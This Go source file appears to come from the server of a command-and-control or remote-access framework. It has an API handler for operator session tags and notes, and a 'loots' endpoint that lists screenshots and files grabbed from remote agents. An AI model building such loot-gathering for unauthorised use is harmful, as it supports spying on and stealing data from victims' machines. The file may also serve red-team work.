package api

import (
	"encoding/json"
	"net/http"
	"strings"

	"wispp/protocol"
	"wispp/server/internal/db"
)

// sessionMeta patches operator context: tags / notes / color (plan §7 UX).
func (a *DebugAPI) sessionMeta(w http.ResponseWriter, r *http.Request) {
	id := r.PathValue("id")
	var req struct {
		Tags  *[]string `json:"tags"`
		Notes *string   `json:"notes"`
		Color *string   `json:"color"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "bad json", http.StatusBadRequest)
		return
	}
	old, _ := a.Store.MetaGet(id)
	m := db.MetaRow{Session: id}
	if old != nil {
		m.Tags, m.Notes, m.Color = old.Tags, old.Notes, old.Color
	}
	if req.Tags != nil {
		clean := make([]string, 0, len(*req.Tags))
		seen := map[string]bool{}
		for _, t := range *req.Tags {
			t = strings.TrimSpace(t)
			if t != "" && !seen[t] && len(clean) < 8 {
				seen[t] = true
				clean = append(clean, t[:min(24, len(t))])
			}
		}
		m.Tags = clean
	}
	if req.Notes != nil {
		n := *req.Notes
		if len(n) > 4000 {
			n = n[:4000]
		}
		m.Notes = n
	}
	if req.Color != nil {
		c := *req.Color
		if c != "" && !validColor(c) {
			http.Error(w, "bad color", http.StatusBadRequest)
			return
		}
		m.Color = c
	}
	if err := a.Store.MetaSet(&m); err != nil {
		http.Error(w, err.Error(), http.StatusInternalServerError)
		return
	}
	writeJSON(w, http.StatusOK, m)
}

func validColor(c string) bool {
	if len(c) != 7 || c[0] != '#' {
		return false
	}
	for _, r := range c[1:] {
		if !((r >= '0' && r <= '9') || (r >= 'a' && r <= 'f') || (r >= 'A' && r <= 'F')) {
			return false
		}
	}
	return true
}

// loots aggregates operator-collected artifacts: screenshots (from completed
// screenshot tasks) and grabbed files (Type3 up-jobs).
func (a *DebugAPI) loots(w http.ResponseWriter, _ *http.Request) {
	type img struct {
		Session string `json:"session"`
		Ts      int64  `json:"ts"`
		Data    string `json:"data"`
	}
	type file struct {
		ID     string `json:"id"`
		Agent  string `json:"agent"`
		Remote string `json:"remote"`
		Size   int64  `json:"size"`
		Status string `json:"status"`
		Ts     int64  `json:"ts"`
	}
	imgs := []img{}
	for _, t := range a.Hub.Tasks("", "") {
		if t.Task.Cmd != protocol.CmdScreenshot || t.Status != protocol.TaskCompleted || t.Result == nil {
			continue
		}
		if !strings.HasPrefix(t.Result.Output, `{"img":"data:image`) {
			continue
		}
		var o struct {
			Img string `json:"img"`
		}
		if json.Unmarshal([]byte(t.Result.Output), &o) == nil && len(o.Img) < 2_000_000 {
			imgs = append(imgs, img{t.SessionID, t.Task.Created, o.Img})
		}
	}
	files := []file{}
	if a.Store != nil {
		if jobs, err := a.Store.FileJobs(""); err == nil {
			for _, j := range jobs {
				if j.Mode == "up" {
					files = append(files, file{j.ID, j.Agent, j.Remote, j.Size, j.Status, j.Created})
				}
			}
		}
	}
	writeJSON(w, http.StatusOK, map[string]any{"images": imgs, "files": files})
}
